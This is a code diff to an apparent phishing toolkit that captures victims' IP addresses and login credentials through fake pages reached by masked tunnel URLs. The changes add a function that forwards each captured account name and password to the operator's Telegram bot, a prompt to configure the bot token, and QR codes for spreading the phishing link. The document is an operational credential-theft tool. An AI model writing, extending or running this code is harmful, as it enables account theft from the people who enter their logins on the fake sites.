@@ -12,11 +12,25 @@ import tarfile
 import re
 import json
 
+try:
+    import requests
+    import qrcode
+except ImportError:
+    print(
+        "\n\033[1;38;2;255;50;50m[!] Missing dependencies. Please run: pip install -r requirements.txt\033[0m"
+    )
+    sys.exit(1)
+
 if sys.stdout.encoding != "utf-8":
     try:
         sys.stdout.reconfigure(encoding="utf-8")
     except AttributeError:
         pass
+
+try:
+    sys.stdin.reconfigure(encoding="utf-8", errors="replace")
+except AttributeError:
+    pass
 
 HOST = "127.0.0.1"
 PORT = "8080"
@@ -283,6 +297,79 @@ def about():
         about()
 
 
+def send_telegram_alert(message):
+    telegram_file = "auth/telegram.json"
+    if os.path.exists(telegram_file):
+        try:
+            with open(telegram_file, "r") as f:
+                data = json.load(f)
+                bot_token = data.get("bot_token")
+                chat_id = data.get("chat_id")
+                if bot_token and chat_id:
+                    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+                    payload = {
+                        "chat_id": chat_id,
+                        "text": message,
+                        "parse_mode": "Markdown",
+                    }
+                    requests.post(url, json=payload, timeout=5)
+        except Exception:
+            pass
+
+
+def setup_telegram():
+    telegram_file = "auth/telegram.json"
+    print()
+    ans = input(
+        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Do You Want To Enable Telegram Alerts? {PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]: {LIGHT2}"
+    )
+    if ans.lower() == "y":
+        if os.path.exists(telegram_file):
+            print(
+                f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Using existing Telegram config in auth/telegram.json...{LIGHT1}"
+            )
+        else:
+            print("\n")
+            bot_token = input(
+                f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Bot Token : {LIGHT1}"
+            )
+            chat_id = input(
+                f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Enter Your Chat ID : {LIGHT1}"
+            )
+            with open(telegram_file, "w") as f:
+                json.dump({"bot_token": bot_token, "chat_id": chat_id}, f)
+            print(
+                f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Telegram configured successfully!{LIGHT1}"
+            )
+    else:
+        print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Telegram Alerts Disabled.{LIGHT1}")
+        if os.path.exists(telegram_file):
+            os.remove(telegram_file)
+
+
+def generate_qr(url):
+    print(f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Generating QR Code...{LIGHT1}")
+    try:
+        qr = qrcode.QRCode(
+            version=1,
+            error_correction=qrcode.constants.ERROR_CORRECT_L,
+            box_size=10,
+            border=4,
+        )
+        qr.add_data(url)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white")
+        qr_path = f"qr_{int(time.time())}.png"
+        img.save(qr_path)
+        print(
+            f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} QR Code Saved As : {LIGHT2}{qr_path}{LIGHT1}"
+        )
+        print(f"\n{LIGHT2}QR Code for scanning:{RESET}\n")
+        qr.print_ascii(tty=True)
+    except Exception as e:
+        print(f"\n{DARK}[{WHITE}!{DARK}]{PINK} Error generating QR Code: {e}{LIGHT1}")
+
+
 def cusport():
     global PORT
     print()
@@ -360,6 +447,9 @@ def capture_ip():
         )
         with open("auth/ip.txt", "a") as f:
             f.writelines(lines)
+        send_telegram_alert(
+            f"🎯 *New IP Captured!*\n\n🌐 *IP:* `{ip}`\n📍 *Platform:* `{website}`"
+        )
 
 
 def capture_creds():
@@ -378,6 +468,9 @@ def capture_creds():
         print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} Saved in : {LIGHT2}auth/usernames.dat")
         with open("auth/usernames.dat", "a") as f:
             f.writelines(lines)
+        send_telegram_alert(
+            f"🔥 *Credentials Captured!*\n\n👤 *Account:* `{account}`\n🔑 *Password:* `{password}`\n📍 *Platform:* `{website}`"
+        )
         print(
             f"\n{DARK}[{WHITE}-{DARK}]{LIGHT2} Waiting for Next Login Info, {MEDIUM}Ctrl + C {LIGHT2}to exit. ",
             end="",
@@ -487,6 +580,7 @@ def custom_url(url):
     print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 2 : {LIGHT2}{processed_url}")
     if "Unable" not in processed_url:
         print(f"\n{DARK}[{WHITE}-{DARK}]{MEDIUM} URL 3 : {LIGHT2}{masked_url}")
+        generate_qr(url)
 
 
 def start_cloudflared():
@@ -806,4 +900,5 @@ if __name__ == "__main__":
     setup_env()
     install_cloudflared()
     install_localxpose()
+    setup_telegram()
     main_menu()
